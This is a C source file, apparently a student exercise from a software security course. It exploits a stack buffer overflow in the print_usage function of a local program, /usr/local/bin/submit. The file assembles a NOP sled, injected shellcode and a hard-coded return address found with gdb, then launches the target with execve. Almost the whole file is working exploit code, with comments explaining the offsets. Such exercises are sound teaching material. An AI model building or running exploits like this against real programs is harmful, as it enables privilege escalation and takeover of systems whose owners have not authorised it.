/*
 * sploit1.c
 * this program uses buffer overflow to attack print_usage function
 * print_usage has a buffer with size 421, but allows input string to have up to 640 bytes. 
 * we can use that to overflow the return address
 */

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_WEAPON_SIZE            453 // 453 =421+32, where 421 is the target buffer size, and 12 includes 4 bytes for ebp and 4 bytes for 4 eip, and some extra
#define NOP                            0x90
#define TARGET "/usr/local/bin/submit"

int main(int argc, char *argv[]) {

  // where our weapon string will be stored

  // The weapon string I use to overwrite to the buffer
  // the buffer size is , I add one hundred bytes as the "smash stack for fun" blog suggested
  char weapon[DEFAULT_WEAPON_SIZE];

  int i;
  // use gdb to figure out this address, 'frame info' and 'x/200 <address>' are two very useful commands
  long buffer_addr = 0xffbfde38;
  long* addr_ptr = (long *) (&weapon[3]); // anticipate the + 1 in the buffer size. but introducing another 3 bytes, the final address is 4bytes aligned
  char *ptr;
  char *env[1];

  // fill the weapon with buffer address
  for (i = 0; i < DEFAULT_WEAPON_SIZE; i+=4) {
    *(addr_ptr++) = buffer_addr;
  }

  // fill the first half of the array with NOPs
  for (i = 0; i < DEFAULT_WEAPON_SIZE/2; i+=1) {
     weapon[i] = NOP;
  }

  // basically copy the shell code to the middle
  ptr = weapon + ((DEFAULT_WEAPON_SIZE/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  // code calling submit
  argv[0] = weapon; argv[1] = NULL; 
  argv[2] = NULL; argv[3] = NULL;

  env[0] = NULL;
  if (execve(TARGET, argv, env) < 0)
    fprintf(stderr, "execve failed.\n");
  return 0;
}
